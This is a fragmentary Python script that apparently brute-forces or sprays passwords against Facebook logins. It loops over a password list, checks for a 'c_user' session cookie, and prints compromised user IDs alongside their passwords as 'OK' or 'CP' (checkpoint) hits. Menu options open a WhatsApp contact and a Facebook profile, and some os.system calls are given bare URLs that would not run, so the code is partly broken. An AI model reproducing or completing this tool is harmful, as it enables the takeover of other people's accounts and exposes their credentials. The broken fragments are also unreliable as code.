...
os.system('xdg-open http://wa.me/+93708509223')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('https://www.facebook.com/profile.php?id=100074818611262')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
def approval():
	...
	if riaz1 =='5':
		approval()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93708509223?text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('https://www.facebook.com/profile.php?id=100074818611262');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Jamjl😜]-OK] '+cid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Jamil HKR😓]-CP] '+uid+' | '+ps+'\x1b[1;97m')
